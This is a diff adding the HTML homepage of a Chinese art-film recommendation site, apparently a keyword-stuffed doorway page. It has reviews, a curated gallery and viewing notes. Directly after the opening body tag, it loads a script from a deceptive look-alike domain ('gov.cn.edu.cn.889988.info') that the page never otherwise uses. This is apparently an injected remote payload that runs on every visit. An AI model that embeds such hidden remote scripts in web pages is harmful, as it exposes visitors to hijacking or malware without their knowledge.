@@ -1,0 +1,467 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="applicable-device" content="pc,mobile">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<title>小调电影网 - 文艺电影推荐与高清观影指南平台</title>
+<meta name="keywords" content="小调电影网,xiaotiaodianyingwang-zh.github.io,文艺电影推荐,高分电影片单,小众佳片,电影赏析,高清观影平台,独立电影,艺术院线,冷门好片">
+<meta name="description" content="小调电影网(xiaotiaodianyingwang-zh.github.io)是一个专注文艺电影推荐与高分片单分享的观影指南平台,精选小众佳片、独立电影与艺术院线作品,提供专业的电影赏析与高清观影指引,带你发现主流视野之外的动人光影。">
+<style>
+*,*::before,*::after{box-sizing:border-box}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{margin:0;font-family:"Georgia","Songti SC","STSong","PingFang SC","Microsoft YaHei",serif;color:#3d3a35;line-height:1.75;background:#fdfaf4}
+a{text-decoration:none;color:inherit}
+button{font-family:inherit;cursor:pointer;border:none;background:none}
+ul{list-style:none;margin:0;padding:0}
+img{max-width:100%}
+:root{
+  --paper:#f7f1e6;
+  --paper2:#fdfaf4;
+  --ink:#2e2a24;
+  --accent:#8a5a2b;
+  --accent-l:#f3e6d2;
+  --olive:#6b705c;
+  --olive-l:#eef0e6;
+  --rust:#a0412f;
+  --rust-l:#f8e6e1;
+  --line:#e8dfcd;
+  --grey:#8b857a;
+  --white:#fffdfa;
+  --serif:"Georgia",serif;
+}
+.wrap{max-width:1120px;margin:0 auto;padding:0 22px}
+
+/* topbar */
+.topbar{background:var(--ink);color:#e8dfcd;padding:8px 0;font-size:12.5px}
+.topbar .wrap{display:flex;justify-content:space-between;gap:12px;flex-wrap:wrap}
+.topbar em{font-style:normal;color:#d4a373}
+
+/* header */
+.head{background:var(--white);border-bottom:1px solid var(--line)}
+.head .wrap{display:flex;align-items:center;justify-content:space-between;height:80px;gap:20px}
+.logo{display:flex;align-items:baseline;gap:10px}
+.logo h1{margin:0;font-family:var(--serif);font-size:26px;font-weight:700;letter-spacing:1px;color:var(--ink)}
+.logo h1 i{font-style:italic;color:var(--rust)}
+.logo span{font-size:11px;color:var(--grey);letter-spacing:3px;text-transform:uppercase;border-left:1px solid var(--line);padding-left:10px}
+.menu{display:flex;gap:2px}
+.menu a{padding:8px 16px;font-size:15px;color:#5a554c;position:relative;transition:.2s;font-family:"PingFang SC","Microsoft YaHei",sans-serif}
+.menu a:hover{color:var(--rust)}
+.menu a:hover::after{content:"";position:absolute;left:16px;right:16px;bottom:2px;height:2px;background:var(--rust)}
+.menu-btn{display:none;width:42px;height:42px;background:var(--paper);color:var(--accent);font-size:20px;border-radius:8px}
+
+/* hero editorial */
+.hero{background:var(--paper);border-bottom:1px solid var(--line);padding:0}
+.hero .wrap{display:grid;grid-template-columns:1.05fr .95fr;gap:0;align-items:stretch;min-height:520px}
+.hero-main{padding:64px 56px 64px 0;display:flex;flex-direction:column;justify-content:center;border-right:1px solid var(--line)}
+.hero .kicker{font-size:12px;letter-spacing:4px;text-transform:uppercase;color:var(--rust);font-weight:700;margin-bottom:22px}
+.hero h2{margin:0 0 22px;font-family:var(--serif);font-size:44px;line-height:1.28;font-weight:700;color:var(--ink)}
+.hero h2 em{font-style:italic;color:var(--accent)}
+.hero .rule{width:60px;height:3px;background:var(--rust);margin:0 0 22px}
+.hero p{margin:0 0 28px;font-size:16px;color:#6b655c;max-width:440px}
+.hero-meta{display:flex;gap:26px;flex-wrap:wrap;margin-bottom:30px}
+.hero-meta div span{display:block;font-family:var(--serif);font-size:26px;font-weight:700;color:var(--accent)}
+.hero-meta div small{font-size:12px;color:var(--grey)}
+.hero-btns{display:flex;gap:14px;flex-wrap:wrap}
+.btn{display:inline-flex;align-items:center;gap:8px;padding:13px 26px;font-size:14.5px;font-weight:600;border-radius:4px;transition:.2s;font-family:"PingFang SC",sans-serif}
+.btn-main{background:var(--ink);color:var(--paper)}
+.btn-main:hover{background:var(--rust)}
+.btn-outline{border:1.5px solid var(--ink);color:var(--ink)}
+.btn-outline:hover{background:var(--ink);color:var(--paper)}
+
+.hero-side{padding:64px 0 64px 56px;display:flex;flex-direction:column;gap:26px}
+.quote{background:var(--white);border-left:4px solid var(--rust);padding:24px 26px;font-family:var(--serif);font-style:italic;font-size:16px;color:#4a453d;line-height:1.8}
+.quote cite{display:block;margin-top:12px;font-style:normal;font-size:12.5px;color:var(--grey);letter-spacing:1px}
+.feat-grid{display:grid;grid-template-columns:1fr 1fr;gap:16px}
+.feat{border-top:2px solid var(--accent);padding-top:14px}
+.feat b{display:block;font-family:var(--serif);font-size:17px;color:var(--ink);margin-bottom:4px}
+.feat p{margin:0;font-size:12.5px;color:var(--grey);line-height:1.6}
+
+/* section */
+.sec{padding:66px 0}
+.sec-paper{background:var(--paper)}
+.heading{display:flex;align-items:flex-end;gap:16px;margin-bottom:34px;flex-wrap:wrap}
+.heading .no{font-family:var(--serif);font-size:13px;color:var(--rust);letter-spacing:2px;font-weight:700;padding-bottom:4px}
+.heading h3{margin:0;font-family:var(--serif);font-size:28px;font-weight:700;color:var(--ink);letter-spacing:.5px}
+.heading .en{font-size:12px;color:var(--grey);letter-spacing:3px;text-transform:uppercase;padding-bottom:5px}
+.heading a.more{margin-left:auto;font-size:13px;color:var(--accent);border-bottom:1px solid var(--accent);padding-bottom:2px;font-family:"PingFang SC",sans-serif}
+.heading a.more:hover{color:var(--rust);border-color:var(--rust)}
+
+/* film cards editorial */
+.editorial{display:grid;grid-template-columns:1.4fr 1fr;gap:36px}
+.lead{border-bottom:1px solid var(--line);padding-bottom:26px}
+.lead .cover{aspect-ratio:16/9;background:linear-gradient(135deg,#8a5a2b,#c08552);display:grid;place-items:center;font-size:64px;color:rgba(255,255,255,.9);margin-bottom:20px;position:relative}
+.lead .cover .badge{position:absolute;top:16px;left:16px;background:var(--rust);color:#fff;font-size:11px;font-weight:700;padding:5px 12px;letter-spacing:2px;font-family:sans-serif}
+.lead h4{margin:0 0 12px;font-family:var(--serif);font-size:24px;line-height:1.4;color:var(--ink)}
+.lead p{margin:0;color:#6b655c;font-size:14.5px}
+.lead .by{margin-top:16px;font-size:12px;color:var(--grey);letter-spacing:1px}
+.side-list{display:flex;flex-direction:column;gap:20px}
+.side-item{display:grid;grid-template-columns:56px 1fr;gap:16px;padding-bottom:20px;border-bottom:1px dotted var(--line)}
+.side-item:last-child{border:none;padding-bottom:0}
+.side-item .idx{font-family:var(--serif);font-size:28px;font-weight:700;color:var(--accent);line-height:1}
+.side-item h5{margin:0 0 6px;font-family:var(--serif);font-size:16.5px;color:var(--ink)}
+.side-item p{margin:0;font-size:12.5px;color:var(--grey)}
+
+/* tag filter */
+.filters{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:30px}
+.filters a{padding:7px 18px;background:var(--white);border:1px solid var(--line);border-radius:2px;font-size:13.5px;color:var(--grey);transition:.2s;font-family:sans-serif}
+.filters a:hover{border-color:var(--accent);color:var(--accent)}
+.filters a.on{background:var(--accent);border-color:var(--accent);color:#fff}
+
+/* gallery */
+.gallery{display:grid;grid-template-columns:repeat(3,1fr);gap:26px}
+.gal{transition:.25s}
+.gal:hover{transform:translateY(-5px)}
+.gal .pic{aspect-ratio:3/4;display:grid;place-items:center;font-size:52px;color:rgba(255,255,255,.92);margin-bottom:14px;position:relative}
+.gal .pic.p1{background:linear-gradient(160deg,#6b705c,#a5a98c)}
+.gal .pic.p2{background:linear-gradient(160deg,#a0412f,#c97963)}
+.gal .pic.p3{background:linear-gradient(160deg,#3d5a80,#7299b8)}
+.gal .pic.p4{background:linear-gradient(160deg,#8a5a2b,#c08552)}
+.gal .pic.p5{background:linear-gradient(160deg,#5c6b6b,#8fa8a8)}
+.gal .pic.p6{background:linear-gradient(160deg,#7b4f71,#b084a6)}
+.gal .pic .tag{position:absolute;top:12px;right:12px;background:rgba(255,255,255,.9);color:var(--ink);font-size:10.5px;padding:4px 9px;border-radius:2px;font-family:sans-serif;font-weight:600}
+.gal .pic .yr{position:absolute;bottom:12px;left:14px;font-size:12px;color:rgba(255,255,255,.95);font-family:var(--serif)}
+.gal h5{margin:0 0 7px;font-family:var(--serif);font-size:18px;color:var(--ink)}
+.gal .desc{margin:0 0 10px;font-size:13px;color:var(--grey)}
+.gal .kw{font-size:11.5px;color:var(--accent);font-family:sans-serif}
+
+/* notes */
+.notes{background:var(--ink);color:var(--paper);padding:66px 0}
+.notes .heading h3{color:var(--paper)}
+.notes .heading .en{color:#a8a096}
+.notes .heading .no{color:#d4a373}
+.notes-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:30px}
+.note{background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.1);padding:28px;transition:.25s}
+.note:hover{border-color:var(--rust);background:rgba(160,65,47,.12)}
+.note time{font-family:var(--serif);font-size:12px;color:#d4a373;letter-spacing:2px}
+.note h5{margin:12px 0 12px;font-family:var(--serif);font-size:19px;line-height:1.45;color:var(--paper)}
+.note p{margin:0;font-size:13.5px;color:#b8b0a2;line-height:1.75}
+.note a{display:inline-block;margin-top:14px;font-size:12.5px;color:#d4a373;border-bottom:1px solid #d4a373;padding-bottom:2px}
+
+/* steps */
+.steps{display:grid;grid-template-columns:repeat(4,1fr);gap:26px;counter-reset:step}
+.step{counter-increment:step;position:relative;padding:26px 22px 26px 26px;background:var(--white);border:1px solid var(--line);transition:.25s}
+.step::before{content:"0" counter(step);position:absolute;top:-16px;left:22px;font-family:var(--serif);font-size:26px;font-weight:700;color:var(--rust);background:var(--paper);padding:2px 10px;border:1px solid var(--line)}
+.step:hover{border-color:var(--accent);transform:translateY(-4px)}
+.step h5{margin:10px 0 8px;font-family:var(--serif);font-size:17px;color:var(--ink)}
+.step p{margin:0;font-size:13px;color:var(--grey);line-height:1.7}
+
+/* subscribe */
+.subscribe{background:var(--paper);padding:66px 0;text-align:center;border-top:1px solid var(--line)}
+.subscribe h3{margin:0 0 14px;font-family:var(--serif);font-size:28px;color:var(--ink)}
+.subscribe p{margin:0 auto 30px;color:var(--grey);max-width:480px;font-size:14.5px}
+.sub-form{display:flex;gap:10px;max-width:460px;margin:0 auto;flex-wrap:wrap}
+.sub-form input{flex:1;min-width:200px;padding:14px 18px;background:var(--white);border:1px solid var(--line);border-radius:2px;font-family:var(--serif);font-size:15px;outline:none}
+.sub-form input:focus{border-color:var(--accent)}
+.sub-form button{padding:14px 30px;background:var(--accent);color:#fff;font-family:sans-serif;font-size:14.5px;font-weight:600;transition:.2s}
+.sub-form button:hover{background:var(--rust)}
+
+/* footer */
+.foot{background:var(--ink);color:#a8a096;padding:54px 0 24px}
+.foot .wrap{display:grid;grid-template-columns:1.6fr 1fr 1fr 1fr;gap:34px}
+.foot h6{margin:0 0 18px;font-family:sans-serif;font-size:13px;letter-spacing:3px;text-transform:uppercase;color:var(--paper)}
+.foot .brand-name{font-family:var(--serif);font-size:22px;color:var(--paper);margin-bottom:14px}
+.foot .brand-name i{font-style:italic;color:#d4a373}
+.foot p.blurb{font-size:13.5px;color:#8b857a;max-width:290px;line-height:1.8}
+.foot ul li{margin-bottom:10px}
+.foot ul a{font-family:sans-serif;font-size:13.5px;color:#a8a096;transition:.2s}
+.foot ul a:hover{color:#d4a373}
+.foot-bot{border-top:1px solid rgba(255,255,255,.1);margin-top:38px;padding-top:22px;text-align:center;font-size:12px;color:#6f6a62;line-height:2;font-family:sans-serif}
+.foot-bot em{font-style:normal;color:#8b857a}
+
+@media(max-width:960px){
+  .hero .wrap{grid-template-columns:1fr;min-height:auto}
+  .hero-main{padding:48px 0;border-right:none;border-bottom:1px solid var(--line)}
+  .hero-side{padding:48px 0}
+  .hero h2{font-size:32px}
+  .editorial{grid-template-columns:1fr;gap:26px}
+  .gallery{grid-template-columns:1fr 1fr;gap:20px}
+  .notes-grid,.steps{grid-template-columns:1fr 1fr}
+  .foot .wrap{grid-template-columns:1fr 1fr;gap:26px}
+  .menu{display:none;position:absolute;top:80px;left:0;right:0;background:var(--white);flex-direction:column;padding:12px 18px;border-top:1px solid var(--line)}
+  .menu.open{display:flex}
+  .menu a{width:100%;padding:11px 0}
+  .menu-btn{display:block}
+  .head .wrap{height:70px}
+}
+@media(max-width:520px){
+  .wrap{padding:0 16px}
+  .hero-main,.hero-side{padding-top:36px;padding-bottom:36px}
+  .hero h2{font-size:27px}
+  .sec{padding:44px 0}
+  .gallery,.notes-grid,.steps{grid-template-columns:1fr}
+  .feat-grid{grid-template-columns:1fr}
+  .foot .wrap{grid-template-columns:1fr}
+  .heading{flex-direction:column;align-items:flex-start;gap:6px}
+  .heading a.more{margin-left:0}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<div class="topbar">
+  <div class="wrap">
+    <span>光影不语 · 小调低吟 · 发现主流之外的动人故事</span>
+    <span><em>收藏小调电影网</em> · 每周精选文艺佳片与深度影评</span>
+  </div>
+</div>
+
+<header class="head">
+  <div class="wrap">
+    <a href="#" class="logo">
+      <h1>小调<i>电影网</i></h1>
+      <span>Film Notes</span>
+    </a>
+    <nav class="menu" id="menu">
+      <a href="#home">首页</a>
+      <a href="#editor">精选影评</a>
+      <a href="#gallery">佳片片库</a>
+      <a href="#notes">观影手记</a>
+      <a href="#steps">如何观影</a>
+      <a href="#about">关于本站</a>
+    </nav>
+    <button class="menu-btn" id="menuBtn" aria-label="菜单">☰</button>
+  </div>
+</header>
+
+<main>
+  <!-- Hero -->
+  <section class="hero" id="home">
+    <div class="wrap">
+      <div class="hero-main">
+        <div class="kicker">Editor's Letter · 主编寄语</div>
+        <h2>在喧闹的流媒体时代，<br>留一段<em>安静</em>的光影时光</h2>
+        <div class="rule"></div>
+        <p>小调电影网是一个为爱电影的人而生的文艺观影指南。我们避开爆米花式的喧嚣，专注挖掘那些值得被反复品味的独立电影、艺术院线与冷门佳作，用克制的文字，陪你重新理解影像的力量。</p>
+        <div class="hero-meta">
+          <div><span>320+</span><small>深度影评</small></div>
+          <div><span>48</span><small>专题片单</small></div>
+          <div><span>每周</span><small>更新精选</small></div>
+        </div>
+        <div class="hero-btns">
+          <a href="#editor" class="btn btn-main">阅读最新影评 →</a>
+          <a href="#gallery" class="btn btn-outline">浏览佳片片库</a>
+        </div>
+      </div>
+      <div class="hero-side">
+        <blockquote class="quote">
+          "电影是每秒二十四帧的真理，而那些被主流忽略的小调，往往藏着最真实的人间。"
+          <cite>— 小调电影网 编辑部</cite>
+        </blockquote>
+        <div class="feat-grid">
+          <div class="feat"><b>深度赏析</b><p>不止于简介，每一篇都拆解镜头、叙事与情感</p></div>
+          <div class="feat"><b>片单策展</b><p>按情绪与主题策展，帮你找到此刻最想看的那部</p></div>
+          <div class="feat"><b>冷门挖掘</b><p>关注小众佳作与新人导演的处女作</p></div>
+          <div class="feat"><b>观影指引</b><p>版本选择、观看顺序与最佳观影环境建议</p></div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Editorial -->
+  <section class="sec" id="editor">
+    <div class="wrap">
+      <div class="heading">
+        <span class="no">No. 01</span>
+        <h3>精选影评</h3>
+        <span class="en">Featured Reviews</span>
+        <a href="#" class="more">全部影评 →</a>
+      </div>
+      <div class="editorial">
+        <article class="lead">
+          <div class="cover">🎞️<span class="badge">封面专题</span></div>
+          <h4>当我们谈论慢电影时，我们在谈论什么</h4>
+          <p>慢电影并非节奏的缓慢，而是一种对时间本身的尊重。本文以塔可夫斯基、贝拉·塔尔与蔡明亮的作品为线索，探讨那些敢于让镜头停留的导演，如何用沉默与长镜头构建出属于影像的诗性空间。</p>
+          <div class="by">文 / 主编 · 摄影美学专栏 · 12 分钟阅读</div>
+        </article>
+        <div class="side-list">
+          <div class="side-item"><div class="idx">01</div><div><h5>《那山那人那狗》重看：一封写给乡土中国的情书</h5><p>重读这部被低估的公路片，山路、邮包与父子沉默间的千言万语。</p></div></div>
+          <div class="side-item"><div class="idx">02</div><div><h5>是枝裕和的家庭图鉴：缺席的父亲与永恒的孩子</h5><p>从《幻之光》到《怪物》，梳理是枝裕和二十余年的家庭叙事演变。</p></div></div>
+          <div class="side-item"><div class="idx">03</div><div><h5>侯麦的四季：用对话构筑的爱情哲学</h5><p>六个道德故事、喜剧与谚语，解读法国新浪潮最后的绅士。</p></div></div>
+          <div class="side-item"><div class="idx">04</div><div><h5>阿莫多瓦的色彩学：红色是西班牙女人的心跳</h5><p>从《神经濒临崩溃的女人》到《平行母亲》，色彩的叙事功能。</p></div></div>
+          <div class="side-item"><div class="idx">05</div><div><h5>新浪潮之后的法国电影：在怀旧与实验之间</h5><p>奥宗、德斯普勒钦、克莱尔·德尼，当代法国作者的不同路径。</p></div></div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Gallery -->
+  <section class="sec sec-paper" id="gallery">
+    <div class="wrap">
+      <div class="heading">
+        <span class="no">No. 02</span>
+        <h3>佳片片库</h3>
+        <span class="en">Curated Selection</span>
+        <a href="#" class="more">完整片单 →</a>
+      </div>
+      <div class="filters">
+        <a href="#" class="on">全部</a>
+        <a href="#">欧洲文艺</a>
+        <a href="#">亚洲新电影</a>
+        <a href="#">独立制作</a>
+        <a href="#">纪录片</a>
+        <a href="#">经典修复</a>
+        <a href="#">女性导演</a>
+      </div>
+      <div class="gallery">
+        <article class="gal">
+          <div class="pic p1">🌾<span class="tag">欧洲文艺</span><span class="yr">2018 · 意大利</span></div>
+          <h5>幸福的拉扎罗</h5>
+          <p class="desc">一位善良的年轻人在两个时空间穿越，一则关于纯真与剥削的现代寓言。</p>
+          <span class="kw"># 寓言 · # 魔幻现实主义</span>
+        </article>
+        <article class="gal">
+          <div class="pic p2">🪁<span class="tag">亚洲新电影</span><span class="yr">2022 · 韩国</span></div>
+          <h5>分手的决心</h4>
+          <p class="desc">朴赞郁用一场山与海之间的爱情，重写悬疑片的情感语法。</p>
+          <span class="kw"># 悬疑 · # 爱情</span>
+        </article>
+        <article class="gal">
+          <div class="pic p3">🌊<span class="tag">经典修复</span><span class="yr">1997 · 丹麦</span></div>
+          <h5>破浪</h5>
+          <p class="desc">拉斯·冯·提尔最动人的一部，信仰、牺牲与爱在一个封闭渔村中燃烧。</p>
+          <span class="kw"># 道格玛95 · # 女性</span>
+        </article>
+        <article class="gal">
+          <div class="pic p4">🎻<span class="tag">独立制作</span><span class="yr">2021 · 美国</span></div>
+          <h5>打开心世界</h5>
+          <p class="desc">十九世纪纽约州的两位农妇，在孤独的边境生活中寻找彼此的温度。</p>
+          <span class="kw"># 女性 · # 时代剧</span>
+        </article>
+        <article class="gal">
+          <div class="pic p5">📷<span class="tag">纪录片</span><span class="yr">2020 · 智利</span></div>
+          <h5>牧羊人胶片</h5>
+          <p class="desc">一部用超8毫米胶片记录的安第斯山脉牧羊生活，时间在这里近乎静止。</p>
+          <span class="kw"># 纪录 · # 自然</span>
+        </article>
+        <article class="gal">
+          <div class="pic p6">🦢<span class="tag">女性导演</span><span class="yr">2023 · 法国</span></div>
+          <h5>坠楼死亡的剖析</h5>
+          <p class="desc">一场法庭审判成为婚姻的解剖台，一位女性导演对真相的冷静追问。</p>
+          <span class="kw"># 金棕榈 · # 婚姻</span>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <!-- Notes -->
+  <section class="notes" id="notes">
+    <div class="wrap">
+      <div class="heading">
+        <span class="no">No. 03</span>
+        <h3>观影手记</h3>
+        <span class="en">Watching Notes</span>
+        <a href="#" class="more" style="color:#d4a373;border-color:#d4a373">更多手记 →</a>
+      </div>
+      <div class="notes-grid">
+        <article class="note">
+          <time>OCT 22, 2026</time>
+          <h5>秋冬观影片单：适合一个人安静看的十部电影</h5>
+          <p>天色渐短，适合把灯调暗，让影像替你说话。这份片单收录了十部适合独处时观看的安静之作，从日本的家庭剧到东欧的散文电影。</p>
+          <a href="#">阅读全文 →</a>
+        </article>
+        <article class="note">
+          <time>OCT 18, 2026</time>
+          <h5>胶片、数字与4K修复：我们该如何选择观看版本</h5>
+          <p>同一部电影的不同版本，观看体验可能天差地别。本文梳理常见修复规格，并给出针对不同影片类型的版本选择建议。</p>
+          <a href="#">阅读全文 →</a>
+        </article>
+        <article class="note">
+          <time>OCT 12, 2026</time>
+          <h5>为什么我们仍然需要电影院</h5>
+          <p>流媒体无法替代的是一种集体观看的仪式感。在黑暗中与他人一同呼吸、一同屏息，是电影最原始的魔法。</p>
+          <a href="#">阅读全文 →</a>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <!-- Steps -->
+  <section class="sec" id="steps">
+    <div class="wrap">
+      <div class="heading">
+        <span class="no">No. 04</span>
+        <h3>如何用好本站</h3>
+        <span class="en">How To Use</span>
+      </div>
+      <div class="steps">
+        <div class="step"><h5>确定心境</h5><p>想被治愈、被震撼，还是想安静地思考？先明确此刻的心境，是选片的第一步。</p></div>
+        <div class="step"><h5>浏览专题片单</h5><p>本站按主题与情绪策展的片单，帮你快速锁定符合当下状态的影片。</p></div>
+        <div class="step"><h5>阅读深度影评</h5><p>每部推荐影片都配有赏析文章，先看影评再观影，体验会完全不同。</p></div>
+        <div class="step"><h5>收藏与回访</h5><p>把感兴趣的影片加入片单，每周回站获取新的策展与手记更新。</p></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Subscribe -->
+  <section class="subscribe" id="about">
+    <div class="wrap">
+      <h3>📮 留下你的名字</h3>
+      <p>小调电影网每周推送一份精心策展的文艺片单与深度影评。如果你也愿意慢下来看一部电影，欢迎与我们同行。</p>
+      <div class="sub-form">
+        <input type="text" value="小调电影网" readonly>
+        <button type="button">收藏本站</button>
+      </div>
+    </div>
+  </section>
+</main>
+
+<footer class="foot">
+  <div class="wrap">
+    <div>
+      <div class="brand-name">小调<i>电影网</i></div>
+      <p class="blurb">一个专注文艺电影推荐与深度赏析的观影指南平台，用克制的文字，带你发现主流视野之外的动人光影。</p>
+    </div>
+    <div>
+      <h6>内容分类</h6>
+      <ul>
+        <li><a href="#">精选影评</a></li>
+        <li><a href="#">佳片片库</a></li>
+        <li><a href="#">观影手记</a></li>
+        <li><a href="#">专题片单</a></li>
+        <li><a href="#">导演研究</a></li>
+      </ul>
+    </div>
+    <div>
+      <h6>片单策展</h6>
+      <ul>
+        <li><a href="#">欧洲文艺片</a></li>
+        <li><a href="#">亚洲新电影</a></li>
+        <li><a href="#">独立与纪录片</a></li>
+        <li><a href="#">经典修复版</a></li>
+        <li><a href="#">女性导演作品</a></li>
+      </ul>
+    </div>
+    <div>
+      <h6>关于我们</h6>
+      <ul>
+        <li><a href="#about">平台介绍</a></li>
+        <li><a href="#">投稿与合作</a></li>
+        <li><a href="#">版权声明</a></li>
+        <li><a href="#">联系编辑部</a></li>
+        <li><a href="#">隐私政策</a></li>
+      </ul>
+    </div>
+  </div>
+  <div class="wrap foot-bot">
+    <em>© 2026 小调电影网 xiaotiaodianyingwang-zh.github.io</em> · 本站为文艺电影资讯与赏析平台，所有影片信息仅供分享与参考，版权归原出品方所有<br>
+    如发现版权问题请及时联系我们，我们将第一时间处理。
+  </div>
+</footer>
+
+<script>
+document.getElementById('menuBtn').addEventListener('click',function(){
+  document.getElementById('menu').classList.toggle('open');
+});
+document.querySelectorAll('.menu a').forEach(function(a){
+  a.addEventListener('click',function(){document.getElementById('menu').classList.remove('open');});
+});
+document.querySelectorAll('.filters a').forEach(function(f){
+  f.addEventListener('click',function(e){e.preventDefault();document.querySelectorAll('.filters a').forEach(function(x){x.classList.remove('on')});f.classList.add('on');});
+});
+</script>
+</body>
+</html>
